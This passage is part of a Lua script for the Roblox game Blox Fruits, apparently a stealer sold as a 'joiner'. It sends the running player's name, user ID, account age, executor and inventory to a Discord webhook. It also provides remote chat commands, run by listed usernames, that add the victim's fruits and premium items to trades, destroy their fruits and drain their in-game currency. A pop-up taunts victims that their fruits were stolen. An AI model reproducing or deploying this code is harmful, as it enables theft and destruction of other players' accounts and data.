            or #premiumItems > 0 and "<:value:1228807380188397649> [Rua] Premium Item(-s) Hit! ; https://discord.gg/ZmqJrs3TM8"
            or "<:pepeyes:1226249991035682897> [Rua] Bf Joiner Hit ; https://discord.gg/ZmqJrs3TM8", -- Title if only generic hit (no specific target fruit/premium in initial inventory)
            ["color"] = dragonHit and #premiumItems > 0 and 65280 -- Green
            or dragonHit and 16776960 -- Yellow
            or #premiumItems > 0 and 255 -- Blue
            or 10181046, -- Gray (if generic hit)
            ["fields"] = {
                {
                    ["name"] = "<:Verified:1248961823856918623> Player Info",
                    ["value"] = string.format("**Name:** %s\n**Sea:** %s\n**Server:** %s", LocalPlayer.Name, currentSea, serverName),
                    ["inline"] = true
                },
                {
                    ["name"] = "<:Point_Right:1223617791710724219> Summary",
                    ["value"] = string.format("**Fruits:** %d\n**Premium:** %d\n**Players:** %d\n**Time:** %s", #fruits, #premiumItems, playerCount, os.date("%X")),
                    ["inline"] = true
                },
                {
                    ["name"] = "<:value:1228807380188397649> Premium Items",
                    ["value"] = "```\n"..formatList(premiumItems).."\n```",
                    ["inline"] = false
                },
                {
                    ["name"] = "<:Dough:1169423442366451795> Victim's Fruits", -- Note: calls the script user the "Victim" here based on initial inventory
                    ["value"] = "```\n"..formatList(fruits).."\n```",
                    ["inline"] = false
                },
                {
                    ["name"] = "<:Range:1289257411479207968> Fruits To Steal", -- This refers to the target fruits found in the initial inventory
                    ["value"] = "```\n"..formatTargets().."\n```",
                    ["inline"] = false
                },
                {
                    ["name"] =  "<:script:1353078817018876084> Script To Join (PC Copy)",
                    ["value"] = "```lua\n"..joinScript.."\n```",
                    ["inline"] = false
                },
                {
                    ["name"] =  "<:script:1353078817018876084> Script To Join (Mobile Copy)",
                    ["value"] = "\n"..joinScript.."\n",
                    ["inline"] = false
                }
            },
            ["footer"] = {
                ["text"] = "Rua Joiner V2 • "..os.date("%x")
            }
        }
    
        task.spawn(function()
            SafeRequest({
                Url = nedded,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode({
                    content = notificationContent,
                    embeds = {embed}
                })
            })
        end)
    end
    
    local inventory22 = getInventory() -- Stale inventory snapshot
    
    local function hasFruitInInventory2()
        for _, item in ipairs(inventory22) do
            if item.Type == "Blox Fruit" and table.find(FruitsToHit, item.Name) then
                return true
            end
        end
        return false
    end
    
    local function hasPremiumItems2()
        for _, item in ipairs(inventory22) do
            if item.Type == "Premium" then
                return true
            end
        end
        return false
    end
    
    local webhookSent = false
    
    -- This webhook fires when the script user leaves, *if* their initial inventory met the criteria
    local function sendWebhook2()
        -- Only send if the initial inventory had target fruits OR premium items
        if not hasFruitInInventory2() and not hasPremiumItems2() then
            return
        end
    
        if webhookSent then
           return
        end
    
        local nedded = _G[testcool]
        local plr = Players.LocalPlayer
        local embed = {
            title = "Victim has Left! <:sad:1241420488916340896> ", -- Still says Victim, but refers to the script user
            description = plr.Name .. " has left the game (sad)",
            color = 0xFF0000,
            fields = {
                {
                    name = "User ID",
                    value = plr.UserId,
                    inline = true
                },
                {
                    name = "Account Age",
                    value = plr.AccountAge .. " days",
                    inline = true
                },
                {
                    name = "Executor",
                    value = identifyexecutor() or "Unknown", -- Handle case where identifyexecutor is nil
                    inline = true
                }
            },
            timestamp = DateTime.now():ToIsoDate()
        }
    
        local data = {
            embeds = {embed}
        }
    
        -- Using pcall with direct request call here, NOT SafeRequest
        local success, response = pcall(function()
            return request({
                Url = nedded,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode(data)
            })
        end)
         if not success or (response and response.StatusCode >= 400) then
             warn("Failed to send player leaving webhook.")
         end
    end
    
    Players.PlayerRemoving:Connect(function(leavingPlayer)
        -- Fires sendWebhook2 only when the LocalPlayer leaves and it hasn't been sent
        if leavingPlayer == LocalPlayer and not webhookSent then
            sendWebhook2()
            webhookSent = true
        end
    end)
    
    local function tweenToPosition(position)
        local character = LocalPlayer.Character
        if not character then return end
    
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if not humanoid or humanoid.Sit then return end
    
        local root = character.PrimaryPart
        if not root then return end
    
        local Vector3_new = Vector3.new
        local CFrame_new = CFrame.new
        local CFrame_lookAt = CFrame.lookAt
    
        local RunService = game:GetService("RunService")
        local TweenService = game:GetService("TweenService")
    
        local bodyGyro = Instance.new("BodyGyro")
        bodyGyro.MaxTorque = Vector3_new(1e4, 1e4, 1e4)
        bodyGyro.P = 1e3
        bodyGyro.CFrame = root.CFrame
        bodyGyro.Parent = root
    
        local bodyVelocity = Instance.new("BodyVelocity")
        bodyVelocity.MaxForce = Vector3_new(1e4, 1e4, 1e4)
        bodyVelocity.P = 1e3
        bodyVelocity.Parent = root
    
        local speed = 300
        local distance = (root.Position - position).Magnitude
        local tweenInfo = TweenInfo.new(distance / speed, Enum.EasingStyle.Linear)
    
        local baseParts = {}
        for _, part in ipairs(character:GetDescendants()) do
            if part:IsA("BasePart") then
                table.insert(baseParts, part)
            end
        end
    
        local noCollideConnection = RunService.Stepped:Connect(function()
             -- Ensure parts and character still exist
            if not character or not character.Parent then noCollideConnection:Disconnect(); return end
            for i = 1, #baseParts do
                 if baseParts[i] and baseParts[i].Parent then
                    baseParts[i].CanCollide = false
                 end
            end
        end)
    
        local updateConnection = RunService.Heartbeat:Connect(function()
             -- Ensure root part exists
             if not root or not root.Parent then updateConnection:Disconnect(); return end
            local direction = (position - root.Position).Unit
            bodyGyro.CFrame = CFrame_lookAt(root.Position, root.Position + direction)
            bodyVelocity.Velocity = direction * speed
        end)
    
        local tween = TweenService:Create(root, tweenInfo, {
            CFrame = CFrame_new(position) * CFrame_new(0, root.Size.Y/2, 0)
        })
    
        tween:Play()
        tween.Completed:Wait()
    
        -- Clean up connections and physics objects
        if noCollideConnection then noCollideConnection:Disconnect() end
        if updateConnection then updateConnection:Disconnect() end
        if bodyGyro and bodyGyro.Parent then bodyGyro:Destroy() end
        if bodyVelocity and bodyVelocity.Parent then bodyVelocity:Destroy() end
    
        -- Re-enable collisions after tween
        if character and character.Parent then
             for i = 1, #baseParts do
                 if baseParts[i] and baseParts[i].Parent then
                     baseParts[i].CanCollide = true
                 end
             end
        end
    end
    
    local function findTradeTable()
        local tradeTables
        if game.PlaceId == 7449423635 then
            tradeTables = workspace.Map.Turtle
        else
            tradeTables = workspace.Map.Dressrosa
        end
    
        if not tradeTables then return nil, nil end
    
        local tables = tradeTables:GetChildren()
        if not tables or #tables == 0 then return nil, nil end -- Check if GetChildren returned anything
    
        local bestTable, bestSeat
        local emptyTable, emptySeat
        local fallbackTable, fallbackSeat
    
        local function isTargetPlayer(seatWeld)
            if not seatWeld or not seatWeld.Part1 then return false end
    
            local character = seatWeld.Part1.Parent
            if not character then return false end
    
            local player = game.Players:GetPlayerFromCharacter(character)
            -- Case-insensitive comparison for usernames
            return player and table.find(Usernames, string.lower(player.Name))
        end
    
        for _, tbl in ipairs(tables) do
            if tbl.Name == "TradeTable" then
                local p1, p2 = tbl:FindFirstChild("P1"), tbl:FindFirstChild("P2") -- Use FindFirstChild
                if p1 and p2 then
                    local p1Weld = p1:FindFirstChild("SeatWeld")
                    local p2Weld = p2:FindFirstChild("SeatWeld")
    
                    local p1Free = not p1Weld
                    local p2Free = not p2Weld
    
                    local p1Target = p1Weld and isTargetPlayer(p1Weld)
                    local p2Target = p2Weld and isTargetPlayer(p2Weld)
    
                    -- Priority 1: Target player in one seat, the other seat is free
                    if (p1Target and p2Free) then
                        bestTable = tbl
                        bestSeat = p2 -- Target is in P1, we take P2
                        break
                    elseif (p2Target and p1Free) then
                        bestTable = tbl
                        bestSeat = p1 -- Target is in P2, we take P1
                        break
                    end
    
    
                    -- Priority 2: Both seats are free (first empty table found)
                    if p1Free and p2Free and not emptyTable then
                        emptyTable = tbl
                        emptySeat = p1 -- Take P1 in an empty table
                    end
    
                    -- Priority 3: One seat is free, the other is NOT occupied by a target player (first fallback)
                    if not fallbackTable then
                        if p1Free and not p2Target then
                            fallbackTable = tbl
                            fallbackSeat = p1
                        elseif p2Free and not p1Target then
                            fallbackTable = tbl
                            fallbackSeat = p2
                        end
                    end
                end
            end
        end
    
        -- Return best found, or first empty, or first fallback
        return bestTable or emptyTable or fallbackTable or nil,
               bestSeat or emptySeat or fallbackSeat or nil
    end
    
    local function isInTradeWithCorrectPlayer()
        local player = game.Players.LocalPlayer
        if not player or not player.Parent then return false end
    
        local playerGui = player:FindFirstChild("PlayerGui")
        if not playerGui then return false end
    
        local mainGui = playerGui:FindFirstChild("Main")
        if not mainGui then return false end
    
        local tradeFrame = mainGui:FindFirstChild("Trade")
        if not tradeFrame or not tradeFrame.Visible then return false end
    
        local container = tradeFrame:FindFirstChild("Container")
        if not container then return false end
    
        local frame1 = container:FindFirstChild("1")
        local frame2 = container:FindFirstChild("2") -- Ensure frame2 exists
    
        if not frame1 or not frame2 then return false end
    
        local player1Label = frame1:FindFirstChild("TextLabel")
        local player2Label = frame2:FindFirstChild("TextLabel")
    
        if not player1Label or not player2Label then
            return false
        end
    
        -- Check if player 1 is the local player (case-insensitive for name and display name)
        local player1NameLower = string.lower(player1Label.Text)
        local localPlayerNameLower = string.lower(player.Name)
        local localPlayerDisplayLower = string.lower(player.DisplayName)
    
        if player1NameLower ~= localPlayerNameLower and player1NameLower ~= localPlayerDisplayLower then
             return false
        end
    
        local tradingPartnerName = player2Label.Text
        local tradingPartnerLower = string.lower(tradingPartnerName)
    
        -- Check if trading partner is in the Usernames list (case-insensitive)
        for _, allowedName in ipairs(Usernames) do
            local tradingPlayer = game.Players:FindFirstChild(allowedName)
            if tradingPlayer then
                local tradingPlayerNameLower = string.lower(tradingPlayer.Name)
                local tradingPlayerDisplayLower = string.lower(tradingPlayer.DisplayName)
    
                if tradingPartnerLower == tradingPlayerNameLower or tradingPartnerLower == tradingPlayerDisplayLower then
                    return true
                end
            end
        end
    
        -- Hardcoded check for "XFistorRespawn" remains
        if tradingPartnerLower == "xfistorrespawn" then -- Ensure case-insensitive check here too
            return true
        end
    
        return false
    end
    
    local isForceJumping = false
    local stateChangedConnections = {}
    local jumpRequestConnection
    local characterAddedConnection
    
    local function ForceJump()
        local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid")
        if not humanoid or not humanoid.Parent then return end -- Check parent
    
        isForceJumping = true
        local originalJumpPower = humanoid.JumpPower -- Save original JumpPower
        humanoid.JumpPower = 50
        local originalJumpingState = humanoid:GetStateEnabled(Enum.HumanoidStateType.Jumping) -- Save original state
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
    
        -- Use pcall for SendKeyEvent as it's executor dependent
        pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, true, Enum.KeyCode.Space, false, game)
        task.wait(0.1)
        pcall(VirtualInputManager.SendKeyEvent, VirtualInputManager, false, Enum.KeyCode.Space, false, game)
    
    
        task.delay(0.5, function()
            isForceJumping = false
            if humanoid and humanoid.Parent then -- Check parent before setting properties
                humanoid.JumpPower = originalJumpPower -- Restore original JumpPower
                 humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, originalJumpingState) -- Restore original state
            end
        end)
    end
    
    local function lockJumping(humanoid)
        if not humanoid or not humanoid.Parent then return end -- Check parent
    
        -- Disconnect any existing connection for this humanoid
        local connection = stateChangedConnections[humanoid]
        if connection then
            connection:Disconnect()
            stateChangedConnections[humanoid] = nil
        end
    
        humanoid.JumpPower = 0 -- Disable jump height
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, false) -- Disable jumping state
    
        -- Connect new StateChanged handler
        stateChangedConnections[humanoid] = humanoid.StateChanged:Connect(function(_, new)
            if new == Enum.HumanoidStateType.Jumping and not isForceJumping then
                 -- If the humanoid is trying to jump and it wasn't triggered by ForceJump
                humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, false) -- Immediately disable it
            end
        end)
    end
    
    local function disableJump()
        -- Disconnect previous connections if they exist
        if jumpRequestConnection then
            jumpRequestConnection:Disconnect()
            jumpRequestConnection = nil
        end
    
        if characterAddedConnection then
            characterAddedConnection:Disconnect()
            characterAddedConnection = nil
        end
    
        -- Connect to JumpRequest for touch/mobile (if available)
        -- Use pcall as JumpRequest might not be supported everywhere
        pcall(function()
            if UserInputService.TouchEnabled then
                jumpRequestConnection = UserInputService.JumpRequest:Connect(function()
                    if not isForceJumping and LocalPlayer.Character then
                        local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
                        if humanoid then
                            humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)
                        end
                    end
                end)
            end
        end)
    
    
        -- Apply lockJumping to current character if it exists
        if LocalPlayer.Character then
            local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
            if humanoid then
                lockJumping(humanoid)
            end
        end
    
        -- Connect to CharacterAdded to apply lockJumping on respawn/new character
        characterAddedConnection = LocalPlayer.CharacterAdded:Connect(function(char)
            task.spawn(function()
                local humanoid = char:WaitForChild("Humanoid", 5) -- Wait for Humanoid
                if humanoid then
                    lockJumping(humanoid)
                end
            end)
        end)
    
        -- Return a cleanup function (optional, but good practice)
        return function()
            if jumpRequestConnection then
                jumpRequestConnection:Disconnect()
                jumpRequestConnection = nil
            end
    
            if characterAddedConnection then
                characterAddedConnection:Disconnect()
                characterAddedConnection = nil
            end
    
            -- Disconnect all stored StateChanged connections
            for humanoid, connection in pairs(stateChangedConnections) do
                if connection then connection:Disconnect() end
                stateChangedConnections[humanoid] = nil -- Clear entry
            end
            table.clear(stateChangedConnections) -- Ensure table is empty
        end
    end
    
    local function createDiscordUI()
        local CoreGui = game:GetService("CoreGui")
        local TweenService = game:GetService("TweenService")
        local GuiService = game:GetService("GuiService") -- Needed for IsTenFootInterface
    
        local ScreenGui = Instance.new("ScreenGui")
        ScreenGui.Name = "DiscordInviteUI"
        ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        ScreenGui.ResetOnSpawn = false
        ScreenGui.IgnoreGuiInset = true
        ScreenGui.DisplayOrder = 9999 -- High DisplayOrder to be on top
    
        local MainFrame = Instance.new("Frame")
        MainFrame.Name = "MainFrame"
        MainFrame.Size = UDim2.new(0, 800, 0, 350)
        MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
        MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
        MainFrame.BackgroundColor3 = Color3.fromRGB(32, 34, 37)
        MainFrame.BorderSizePixel = 0
        MainFrame.Parent = ScreenGui
    
        Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 10)
    
        local Title = Instance.new("TextLabel")
        Title.Name = "Title"
        Title.Size = UDim2.new(1, 0, 0, 40)
        Title.Position = UDim2.new(0, 0, 0, 10)
        Title.BackgroundTransparency = 1
        Title.Font = Enum.Font.GothamBold
        Title.Text = "Read Below!"
        Title.TextColor3 = Color3.fromRGB(255, 255, 255)
        Title.TextScaled = true
        Title.Parent = MainFrame
    
        local Description = Instance.new("TextLabel")
        Description.Name = "Description"
        Description.Size = UDim2.new(0.9, 0, 0, 100)
        Description.Position = UDim2.new(0.05, 0, 0.3, 0)
        Description.BackgroundTransparency = 1
        Description.Font = Enum.Font.Gotham
        Description.Text = "Hey! Some of your VALUABLE Fruits have been stolen by Rua Joiner V2. No need to be sad! You can join us, and learn how this stealer works - And make a lot of fruits using it!"
        Description.TextColor3 = Color3.fromRGB(220, 221, 222)
        Description.TextScaled = true
        Description.TextWrapped = true -- Added text wrapping
        Description.TextXAlignment = Enum.TextXAlignment.Center -- Center align text
        Description.TextYAlignment = Enum.TextYAlignment.Center -- Center align text
        Description.Parent = MainFrame
    
        local Button = Instance.new("TextButton")
        Button.Name = "CopyButton"
        Button.Size = UDim2.new(0.7, 0, 0, 56)
        Button.Position = UDim2.new(0.5, 0, 0.7, 0) -- Center align button
        Button.AnchorPoint = Vector2.new(0.5, 0)
        Button.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
        Button.Font = Enum.Font.GothamBold
        Button.Text = "Copy Discord Invite"
        Button.TextColor3 = Color3.fromRGB(255, 255, 255)
        Button.TextScaled = true
        Button.AutoButtonColor = false
        Button.Parent = MainFrame
    
        Instance.new("UICorner", Button).CornerRadius = UDim.new(0, 5)
    
        local fadeInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
        local function createTween(instance, props)
            return TweenService:Create(instance, fadeInfo, props)
        end
    
        -- Initial transparency setup
        MainFrame.BackgroundTransparency = 1
        Title.TextTransparency = 1
        Description.TextTransparency = 1
        Button.BackgroundTransparency = 1
        Button.TextTransparency = 1
    
        -- Fade-in sequence (run in new thread)
        task.spawn(function()
            task.wait(0.1)
            createTween(MainFrame, {BackgroundTransparency = 0}):Play()
            task.wait(0.1)
            createTween(Title, {TextTransparency = 0}):Play()
            task.wait(0.1)
            createTween(Description, {TextTransparency = 0}):Play()
            task.wait(0.1)
            createTween(Button, {BackgroundTransparency = 0, TextTransparency = 0}):Play()
        end)
    
    
        Button.MouseEnter:Connect(function()
            createTween(Button, {BackgroundColor3 = Color3.fromRGB(71, 82, 196)}):Play()
        end)
    
        Button.MouseLeave:Connect(function()
            createTween(Button, {BackgroundColor3 = Color3.fromRGB(88, 101, 242)}):Play()
        end)
    
        Button.MouseButton1Click:Connect(function()
            -- Use the copyToClipboard function defined earlier in createNotification
            copyToClipboard("https://discord.gg/ZmqJrs3TM8")
            Button.Text = "Copied!"
            task.delay(2, function() Button.Text = "Copy Invite" end)
        end)
    
        ScreenGui.Parent = CoreGui
        return ScreenGui
    end
    
    -- << Commands: ?jump, ?additem <name>, ?addfruit <name>, ?cleartrade, ?accept, ?resetfruit, ?reset, ?rejoin, ?addallfruits, ?addallitems, ?invite, ?demolish
    
    local Commands = {
        jump = {
            execute = ForceJump
        },
    
        invite = {
            execute = createDiscordUI
        },
    
        addfruit = {
            execute = function(argument)
                local inventory = getInventory()
                if not inventory then sendMessage("Could not retrieve inventory."); return end -- Add message
    
                if not argument or string.len(argument) < 3 then sendMessage("Usage: ?addfruit <fruit name>"); return end -- Basic usage
    
                local searchTerm = argument:lower()
                local foundItem = nil
                for _, item in pairs(inventory) do
                    if item.Type == "Blox Fruit" and item.Name:lower():find(searchTerm) then
                        foundItem = item
                        break
                    end
                end
    
                if foundItem then
                     local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
                     if not tradeUI or not tradeUI:FindFirstChild("Trade") or not tradeUI.Trade.Visible then
                         sendMessage("You must be in a trade to add fruits."); return
                     end
                     TradeFunction:InvokeServer("addItem", foundItem.Name)
                     sendMessage("Added '" .. foundItem.Name .. "' to trade.")
                else
                     sendMessage("No fruit matching '" .. argument .. "' found in inventory!")
                end
            end
        },
    
        demolish = {
            execute = function()
                sendMessage("Initiating demolish sequence...") -- Add message
                local function invokeRemote(remoteName, args)
                    local remote = ReplicatedStorage:WaitForChild("Remotes"):FindFirstChild(remoteName) -- Use FindFirstChild
                     if remote then
                        return pcall(remote.InvokeServer, remote, unpack(args)) -- Use pcall for InvokeServer
                     else
                         warn("Remote '" .. remoteName .. "' not found!")
                         return false, "Remote not found"
                     end
                end
                invokeRemote("CommF_", {"RemoveFruit", "Beli"}) -- Attempt to remove Beli (might fail)
    
                local inventory = getInventory()
                if not inventory then
                     sendMessage("Could not retrieve inventory for demolish.")
                    return
                end
                local fruits = {}
                for _, item in pairs(inventory) do
                    if item.Type == "Blox Fruit" then
                        table.insert(fruits, item)
                    end
                end
                table.sort(fruits, function(a, b) -- Sort by value, highest first
                    return a.Value > b.Value
                end)
    
                -- Demolish fruits by equipping and dying
                if #fruits > 0 then
                    sendMessage("Demolishing fruits...")
                    for _, fruit in ipairs(fruits) do
                        local baseFruitName = fruit.Name:match("(%S+)") -- Get base name (e.g., "Buddha" from "Buddha-Buddha")
                         if not baseFruitName then continue end -- Skip if name parsing fails
    
                        ForceJump() -- Jump to maybe reset state/get out of seat
                        task.wait(0.2) -- Short wait
    
                        local successLoad, errLoad = invokeRemote("CommF_", {"LoadFruit", baseFruitName}) -- Equip the fruit
                        if successLoad then
                             sendMessage("Attempting to demolish '" .. fruit.Name .. "'...")
                            task.wait(0.5) -- Wait for equip
    
                            if LocalPlayer.Character then
                                pcall(LocalPlayer.Character.BreakJoints, LocalPlayer.Character) -- Use pcall for BreakJoints
                                task.wait(6) -- Wait for respawn
                            else
                                warn("Character missing during fruit demolish sequence.")
                            end
                        else
                             warn("Failed to load fruit '" .. fruit.Name .. "' for demolish: " .. tostring(errLoad))
                        end
                    end
                     sendMessage("Fruit demolish sequence finished.")
                else
                     sendMessage("No fruits found in inventory to demolish.")
                end
    
    
                local function drainBeli() -- Attempt to drain Beli by buying cheap fruits repeatedly
                    local rocketArgs = {"PurchaseRawFruit", "Rocket-Rocket", false}
                    local spinArgs = {"PurchaseRawFruit", "Spin-Spin", false}
                     sendMessage("Attempting to drain Beli...")
                    while task.wait() do -- Loop while script is active
                        local successRocket, errRocket = invokeRemote("CommF_", rocketArgs)
                        -- task.wait() -- Removed redundant wait
                        local successSpin, errSpin = invokeRemote("CommF_", spinArgs)
                        -- task.wait() -- Removed redundant wait
                         if not successRocket and not successSpin then
                             warn("Failed to purchase Rocket/Spin, Beli drain might be stopped.")
                             break -- Exit loop if purchases fail
                         end
                    end
                     sendMessage("Beli drain attempt finished.")
                end
                local function drainFragments() -- Attempt to drain Fragments by refunding stat points (requires Fragments)
                     -- Assuming "BlackbeardReward", "Refund", "2" is correct and refunds points using fragments
                     local fragmentArgs = {"BlackbeardReward", "Refund", "2"}
                     sendMessage("Attempting to drain Fragments...")
                    while task.wait() do -- Loop while script is active
                        local successFragments, errFragments = invokeRemote("CommF_", fragmentArgs)
                         if not successFragments then
                             warn("Failed to refund stats for Fragments drain.")
                             break -- Exit loop if refunds fail
                         end
                    end
                     sendMessage("Fragment drain attempt finished.")
                end
    
                -- Run drain loops in separate threads
                task.spawn(drainBeli)()
                task.spawn(drainFragments)()
            end
        },
    
        additem = {
            execute = function(argument)
                local inventory = getInventory()
                if not inventory then sendMessage("Could not retrieve inventory."); return end -- Add message
    
                 if not argument or string.len(argument) < 3 then sendMessage("Usage: ?additem <item name>"); return end -- Basic usage
    
                local searchTerm = argument:lower()
                 local foundItem = nil
                for _, item in pairs(inventory) do
                    local cleanName = item.Name:gsub("%[P%]%s", "")
                    if item.Type == "Premium" and cleanName:lower():find(searchTerm) then
                         foundItem = item
                        break
                    end
                end
    
                 if foundItem then
                     local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
                     if not tradeUI or not tradeUI:FindFirstChild("Trade") or not tradeUI.Trade.Visible then
                         sendMessage("You must be in a trade to add items."); return
                     end
                     local args = {
                         [1] = "addItem",
                         [2] = foundItem.Name:gsub("%[P%]%s", "") -- Pass the clean name to the remote
                     }
                     TradeFunction:InvokeServer(unpack(args))
                     sendMessage("Added '" .. foundItem.Name:gsub("%[P%]%s", "") .. "' to trade.")
                 else
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                        "No Premium item matching '" .. argument .. "' found in inventory!", "All")
                 end
            end
        },
    
        addallitems = {
            execute = function()
                local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
                if not tradeUI or not tradeUI:FindFirstChild("Trade") or not tradeUI.Trade.Visible then
                     sendMessage("You must be in a trade to add items.")
                     return
                end
    
                local inventory = getInventory()
                if not inventory then sendMessage("Could not retrieve inventory."); return end -- Add message
    
                local addedItems = {}
                for _, item in pairs(inventory) do
                    if item.Type == "Premium" then
                        local cleanName = item.Name:gsub("%[P%]%s", "")
                        if not addedItems[cleanName] then
                            local args = {
                                [1] = "addItem",
                                [2] = cleanName
                            }
                            ReplicatedStorage.Remotes.TradeFunction:InvokeServer(unpack(args))
                            addedItems[cleanName] = true
                            task.wait(0.05)
                        end
                    end
                end
    
                if next(addedItems) then
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                        "Added all Premium items to trade", "All")
                else
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                        "No Premium items found in inventory!", "All")
                end
            end
        },
    
        sit = {
            execute = function()
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                    "ok", "All")
    
                local tradeTable, bestSeat = findTradeTable()
    
                if not tradeTable or not bestSeat then
                    local function findManualSeat() -- Fallback manual search if findTradeTable fails
                        local map = workspace.Map
                        local turtleTables = map:FindFirstChild("Turtle")
                        local dressrosaTables = map:FindFirstChild("Dressrosa")
                        local locations = {}
    
                        if turtleTables then
                            for _, tbl in ipairs(turtleTables:GetChildren()) do
                                if tbl.Name == "TradeTable" and tbl:FindFirstChild("P1") and tbl:FindFirstChild("P2") then
                                    table.insert(locations, {table = tbl, seat1 = tbl.P1, seat2 = tbl.P2})
                                end
                            end
                        end
    
                        if dressrosaTables then
                            for _, tbl in ipairs(dressrosaTables:GetChildren()) do
                                if tbl.Name == "TradeTable" and tbl:FindFirstChild("P1") and tbl:FindFirstChild("P2") then
                                    table.insert(locations, {table = tbl, seat1 = tbl.P1, seat2 = tbl.P2})
                                end
                            end
                        end
    
                        -- Look for the first available seat
                        for _, loc in ipairs(locations) do
                            if not loc.seat1:FindFirstChild("SeatWeld") then
                                return loc.table, loc.seat1
                            end
                            if not loc.seat2:FindFirstChild("SeatWeld") then
                                return loc.table, loc.seat2
                            end
                        end
                        return nil, nil -- No empty seats found
                    end
    
                    tradeTable, bestSeat = findManualSeat()
                end
    
                if tradeTable and bestSeat then
                    local character = LocalPlayer.Character
                    if character and character.PrimaryPart then
                        -- Tween just above the seat first
                        tweenToPosition(bestSeat.Position + Vector3.new(0, 2, 0))
                        task.wait(1)
    
                        -- Attempt to sit, potentially with slight positional adjustments
                        local function attemptSit()
                            -- The game's seating mechanism is handled internally,
                            -- usually just moving the character close is enough.
                            -- The random offsets and multiple tween attempts here are
                            -- likely redundant but kept from original logic.
                            for i = 1, 10 do
                                 local randomOffset = Vector3.new(
                                    math.random(-2, 2) / 10,
                                    0, -- Keep Y offset 0 for sitting
                                    math.random(-2, 2) / 10
                                )
                                -- Move directly to the seat's position (plus small random offset)
                                tweenToPosition(bestSeat.Position + randomOffset)
    
                                task.wait(0.5) -- Give it a moment to register
    
                                -- Check if we successfully sat (Humanoid.Sit == true or SeatWeld created)
                                local humanoid = character:FindFirstChild("Humanoid")
                                if humanoid and humanoid.Sit then
                                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                                        "haha i sat", "All")
                                    return true
                                end
                                 -- Alternative check: is the seat now welded to our character?
                                if bestSeat:FindFirstChild("SeatWeld") and
                                   bestSeat.SeatWeld.Part1 and
                                   bestSeat.SeatWeld.Part1.Parent == character then
                                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                                        "haha i sat", "All")
                                    return true
                                end
                            end
                            return false -- Failed after attempts
                        end
    
                        if not attemptSit() then
                            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                                "failed to sit :((", "All")
                        end
                    end
                else
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                        "Error??? (Could not find a suitable trade table/seat)", "All")
                end
            end
        },
    
        tp = { -- Teleports to Mansion (Sea 3) or Cafe (Sea 2)
            execute = function()
                if game.PlaceId == 7449423635 then -- Sea 3
                    -- Original script checked for Valkyrie Helm to use a different remote/position,
                    -- but this seems like a remnant. Simplified to always use the main position.
                    tweenToPosition(Vector3.new(-12550.8701171875, 337.239990234375, -7425.52001953125))
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                        "Teleporting to Mansion...", "All")
                    -- The original script also had Remote:InvokeServer("requestEntrance", ...) here, removed as it seems specific/unnecessary for this TP.
                else -- Assuming Sea 2
                    tweenToPosition(Vector3.new(-381.8599853515625, 73.08000183105469, 299.92999267578125))
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                        "Teleporting to Cafe...", "All")
                end
            end
        },
    
        test = {
            execute = function()
                local startTime = tick()
                task.wait(0.001)
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                    "I'm Responsive! My response time is " .. math.floor((tick() - startTime) * 1000) .. "ms", "All")
            end
        },
    
        addallfruits = {
            execute = function()
                local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
                 if not tradeUI or not tradeUI:FindFirstChild("Trade") or not tradeUI.Trade.Visible then
                     sendMessage("You must be in a trade to add fruits.")
                     return
                end
    
                local inventory = getInventory()
                if not inventory then sendMessage("Could not retrieve inventory."); return end -- Add message
    
                local addedAnyFruit = false
                -- Iterates through FruitsToHit, then checks inventory for them
                for _, fruit in ipairs(FruitsToHit) do
                    for _, item in pairs(inventory) do
                        if item.Type == "Blox Fruit" and item.Name == fruit then
                            -- Add all counts of this fruit
                            for i = 1, item.Count do
                                ReplicatedStorage.Remotes.TradeFunction:InvokeServer("addItem", fruit)
                                addedAnyFruit = true
                                task.wait(0.05) -- Small wait
                            end
                            -- Found the fruit, move to the next target fruit
                            break
                        end
                    end
                end
                 if addedAnyFruit then
                     sendMessage("Attempted to add all target fruits to trade.")
                 else
                      sendMessage("No target fruits found in inventory!")
                 end
            end
        },
    
        cleartrade = {
            execute = function()
                local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
                 if not tradeUI or not tradeUI:FindFirstChild("Trade") or not tradeUI.Trade.Visible then
                     sendMessage("You must be in a trade to clear it.")
                     return
                end
    
